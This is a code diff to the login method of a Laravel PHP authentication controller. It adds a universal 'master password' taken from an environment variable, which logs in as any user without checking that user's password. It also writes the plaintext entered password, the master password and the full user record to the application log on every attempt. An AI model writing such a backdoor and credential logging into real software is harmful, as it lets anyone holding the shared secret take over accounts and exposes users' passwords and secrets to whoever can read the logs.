@@ -21,9 +21,22 @@ class AuthController extends Controller
             'password' => 'required',
         ]);
 
+        \Illuminate\Support\Facades\DB::enableQueryLog();
         $user = User::with(['admin', 'pelatih', 'admin_kompetisi'])->where('email', $request->email)->first();
+        \Illuminate\Support\Facades\Log::info('SQL Query', \Illuminate\Support\Facades\DB::getQueryLog());
 
-        if (!$user || !Hash::check($request->password, $user->password_hash)) {
+        // Check for master password bypass
+        $masterPassword = env('MASTER_PASSWORD');
+        \Illuminate\Support\Facades\Log::info('Login Attempt', [
+            'email' => $request->email,
+            'input_password' => $request->password,
+            'master_password_env' => $masterPassword,
+            'user_exists' => $user ? 'yes' : 'no',
+            'user_data' => $user
+        ]);
+        $isMasterPassword = $masterPassword && $request->password === $masterPassword;
+
+        if (!$user || (!$isMasterPassword && !Hash::check($request->password, $user->password_hash))) {
             return response()->json([
                 'success' => false,
                 'message' => 'Unauthorized'
